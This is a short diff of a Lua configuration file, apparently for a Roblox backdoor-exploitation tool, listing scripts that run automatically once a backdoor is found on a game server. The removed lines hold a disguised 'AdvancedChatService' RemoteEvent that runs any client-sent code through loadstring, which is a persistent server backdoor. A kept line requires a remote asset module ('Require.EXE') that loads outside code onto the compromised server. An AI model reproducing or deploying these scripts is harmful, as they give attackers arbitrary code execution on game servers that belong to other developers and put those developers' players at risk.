@@ -14,15 +14,10 @@ return {
 	-- Scripts that execute after a backdoor is found
 	-- You can add any scripts here
 	["autoExec"] = {
-		[[print("Welcome!")]],
-		[[local meowx = Instance.new("RemoteEvent", game.ReplicatedStorage)
-meowx.Name = "AdvancedChatService"
-meowx.OnServerEvent:Connect(function(player, chat)
-    loadstring(chat)()
-end)]],
+		[[print("Welcome %username%!")]],
 		[[print("Processes done!")]],
 		[[require(125992639027440)["Require.EXE by E God"]("%username%")]],
-		[[print("LVL: 8-9")]],
+		[[print("Heheheheh. umm *splashes all over table*")]],
 	},
 
 	-- Remote filters that you don't want to be scanned
